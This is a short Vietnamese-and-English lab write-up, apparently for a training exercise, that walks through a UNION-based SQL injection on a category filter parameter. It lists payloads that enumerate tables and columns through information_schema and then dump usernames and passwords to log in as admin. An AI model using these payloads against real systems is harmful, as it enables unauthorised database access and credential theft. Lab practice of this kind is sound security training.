đăng nhập bằng tài khoản admin 

For example, you can query information_schema.tables to list the tables in the database:

SELECT * FROM information_schema.tables

You can then query information_schema.columns to list the columns in individual tables:

SELECT * FROM information_schema.columns WHERE table_name = 'Users'

<img width="1466" height="847" alt="image" src="https://github.com/user-attachments/assets/57e6101e-6779-4685-bcda-e14c87633e8e" />

GET /filter?category='+union+select+table_name,null+from+information_schema.tables --+ HTTP/2

<img width="1485" height="936" alt="image" src="https://github.com/user-attachments/assets/7e786c09-7837-4be9-b8b0-643b53134925" />

Workflow ở đây của chúng ta là có 2 table .1 cái về table và 1 cái về column . 

Đầu tiên chúng ta check table --> sau đó dùng table đó để check column 

--> có column thì chúng ta sẽ tìm ra user --> dùng user đó union để tìm kiếm tài khoản admin chúng ta cần 

REQUEST SẼ THEO DẠNG 

'+UNION+SELECT+NULL,NULL --+

'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables --+

'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_geqsbx' --+  @@TRUY TÌM USERS THEO BÀI 

'UNION+SELECT+username_tbkhkt,password_ssxyce+From+users_geqsbx

--> FIND ADMIN --< SOLVE LAB
